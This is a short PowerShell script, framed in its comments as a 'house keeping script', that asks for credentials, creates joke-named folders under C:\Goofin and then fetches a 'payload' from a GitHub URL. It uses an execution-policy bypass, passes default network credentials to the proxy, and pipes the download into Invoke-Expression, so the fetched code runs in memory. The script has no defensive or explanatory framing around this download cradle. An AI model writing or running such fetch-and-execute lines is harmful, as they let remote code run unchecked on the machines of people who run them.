# House keeping script that downloads current version of buttboss from github and executes in memory instead

# Get creds to run as admin / warn a scrub 
Get-Credentials

# Create goofin/butts goofin/cuts
Mkdir "C:\Goofin\butts" -Force
Mkdir "C:\Goofin\cuts" -Force

# Grab payload from github and execute in memory
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://github.com/mellonaut/buttboss/buttboss.ps1')|iex"
